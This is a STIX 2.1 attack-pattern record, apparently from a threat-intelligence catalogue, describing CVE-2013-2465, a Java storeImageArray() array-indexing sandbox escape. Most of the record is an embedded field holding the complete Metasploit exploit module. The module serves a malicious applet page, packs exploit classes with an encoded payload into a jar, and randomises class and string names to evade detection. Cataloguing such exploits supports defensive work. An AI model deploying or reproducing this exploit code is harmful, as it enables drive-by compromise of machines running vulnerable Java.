{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--69e791c1-b9e6-4a8f-a523-07eed9bad662",
    "created": "2024-08-14T17:05:31.46473Z",
    "modified": "2024-08-14T17:05:31.464735Z",
    "name": "Java storeImageArray() Invalid Array Indexing Vulnerability",
    "description": " This module abuses an Invalid Array Indexing Vulnerability on the static function storeImageArray() function in order to cause a memory corruption and escape the Java Sandbox. The vulnerability affects Java version 7u21 and earlier. The module, which doesn't bypass click2play, has been tested successfully on Java 7u21 on Windows and Linux systems.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/java_storeimagearray.rb",
            "external_id": "java_storeimagearray.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2465"
        },
        {
            "source_name": "reference",
            "url": "http://hg.openjdk.java.net/jdk7u/jdk7u-dev/jdk/rev/2a9c79db0040"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking # Because there isn't click2play bypass, plus now Java Security Level High by default\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({ :javascript => false })\n\n  def initialize( info = {} )\n    super( update_info( info,\n      'Name'          => 'Java storeImageArray() Invalid Array Indexing Vulnerability',\n      'Description'   => %q{\n        This module abuses an Invalid Array Indexing Vulnerability on the\n        static function storeImageArray() function in order to cause a\n        memory corruption and escape the Java Sandbox. The vulnerability\n        affects Java version 7u21 and earlier. The module, which doesn't bypass\n        click2play, has been tested successfully on Java 7u21 on Windows and\n        Linux systems.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n        [\n          'Unknown',  # From PacketStorm\n          'sinn3r', # Metasploit\n          'juan vazquez' # Metasploit\n        ],\n      'References'    =>\n        [\n          [ 'CVE', '2013-2465' ],\n          [ 'OSVDB', '96269' ],\n          [ 'EDB', '27526' ],\n          [ 'PACKETSTORM', '122777' ],\n          [ 'URL', 'http://hg.openjdk.java.net/jdk7u/jdk7u-dev/jdk/rev/2a9c79db0040' ]\n        ],\n      'Platform'      => %w{ java linux win },\n      'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },\n      'Targets'       =>\n        [\n          [ 'Generic (Java Payload)',\n            {\n              'Arch'     => ARCH_JAVA,\n              'Platform' => 'java'\n            }\n          ],\n          [ 'Windows Universal',\n            {\n              'Arch'     => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ],\n          [ 'Linux x86',\n            {\n              'Arch'     => ARCH_X86,\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-08-12'\n      ))\n  end\n\n  def setup\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2013-2465\", \"Exploit.class\")\n    @exploit_class = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2013-2465\", \"Exploit$MyColorModel.class\")\n    @color_model_class = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2013-2465\", \"Exploit$MyColorSpace.class\")\n    @color_space_class = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n\n    @exploit_class_name = rand_text_alpha(\"Exploit\".length)\n    @color_model_class_name = rand_text_alpha(\"MyColorModel\".length)\n    @color_space_class_name = rand_text_alpha(\"MyColorSpace\".length)\n\n    @exploit_class.gsub!(\"Exploit\", @exploit_class_name)\n    @exploit_class.gsub!(\"MyColorModel\", @color_model_class_name)\n    @exploit_class.gsub!(\"MyColorSpace\", @color_space_class_name)\n\n    @color_model_class.gsub!(\"Exploit\", @exploit_class_name)\n    @color_model_class.gsub!(\"MyColorModel\", @color_model_class_name)\n    @color_model_class.gsub!(\"MyColorSpace\", @color_space_class_name)\n\n\n    @color_space_class.gsub!(\"Exploit\", @exploit_class_name)\n    @color_space_class.gsub!(\"MyColorModel\", @color_model_class_name)\n    @color_space_class.gsub!(\"MyColorSpace\", @color_space_class_name)\n\n    super\n  end\n\n  def on_request_uri( cli, request )\n    vprint_status(\"Requesting: #{request.uri}\")\n    if request.uri !~ /\\.jar$/i\n      if not request.uri =~ /\\/$/\n        vprint_status(\"Sending redirect...\")\n        send_redirect(cli, \"#{get_resource}/\", '')\n        return\n      end\n\n      print_status(\"Sending HTML...\")\n      send_response_html(cli, generate_html, {'Content-Type'=>'text/html'})\n      return\n    end\n\n    print_status(\"Sending .jar file...\")\n    send_response(cli, generate_jar(cli), {'Content-Type'=>'application/java-archive'})\n\n    handler( cli )\n  end\n\n  def generate_html\n    jar_name = rand_text_alpha(5+rand(3))\n    html = %Q|<html>\n    <head>\n    </head>\n    <body>\n    <applet archive=\"#{jar_name}.jar\" code=\"#{@exploit_class_name}\" width=\"1000\" height=\"1000\">\n    </applet>\n    </body>\n    </html>\n    |\n    html = html.gsub(/^ {4}/, '')\n    return html\n  end\n\n  def generate_jar(cli)\n\n    p = regenerate_payload(cli)\n    jar  = p.encoded_jar\n\n    jar.add_file(\"#{@exploit_class_name}.class\", @exploit_class)\n    jar.add_file(\"#{@exploit_class_name}$#{@color_model_class_name}.class\", @color_model_class)\n    jar.add_file(\"#{@exploit_class_name}$#{@color_space_class_name}.class\", @color_space_class)\n    metasploit_str = rand_text_alpha(\"metasploit\".length)\n    payload_str = rand_text_alpha(\"payload\".length)\n    jar.entries.each { |entry|\n      entry.name.gsub!(\"metasploit\", metasploit_str)\n      entry.name.gsub!(\"Payload\", payload_str)\n      entry.data = entry.data.gsub(\"metasploit\", metasploit_str)\n      entry.data = entry.data.gsub(\"Payload\", payload_str)\n    }\n    jar.build_manifest\n\n    return jar.pack\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-08-12",
    "x_mitre_platforms": [
        "linux"
    ]
}